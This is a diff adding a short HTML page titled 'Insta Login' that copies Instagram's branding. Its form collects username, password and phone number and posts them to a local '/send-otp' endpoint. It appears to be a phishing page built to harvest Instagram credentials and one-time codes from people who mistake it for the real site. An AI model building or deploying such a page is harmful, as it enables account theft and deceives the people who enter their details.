@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title> Insta Login</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="/insta.jpg" alt="insta Logo">
+            <h1>Instagram</h1>
+            <p>Login Portal</p>
+        </header>
+        <form action="/send-otp" method="POST">
+            <input type="text" name="usernanme" placeholder="user name" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="tel" name="phone" placeholder="Phone Number (+91...)" required>
+            <button type="submit">Send OTP</button>
+        </form>
+    </div>
+</body>
+</html>
